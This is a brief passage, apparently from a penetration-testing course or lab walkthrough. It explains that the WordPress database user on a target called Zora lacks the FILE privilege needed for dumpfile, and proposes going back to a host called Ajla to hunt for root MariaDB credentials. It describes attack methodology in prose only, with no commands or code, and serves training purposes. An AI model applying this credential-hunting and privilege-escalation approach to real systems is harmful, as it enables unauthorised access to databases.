 While the user does have permissions to run SELECT, INSERT, UPDATE, and DELETE, the wp useris missing the FILE permissions to be allowed to run dumpfile.736 To run dumpfile we need a useraccount with a higher level of permissions, such as the root user. Without this, we are stuck andcannot move forward with exploiting Zora using the current approach. The first logical option thatcomes to mind is to go back to Ajla and see if we can find root (or similar) MariaDB credentials
 
 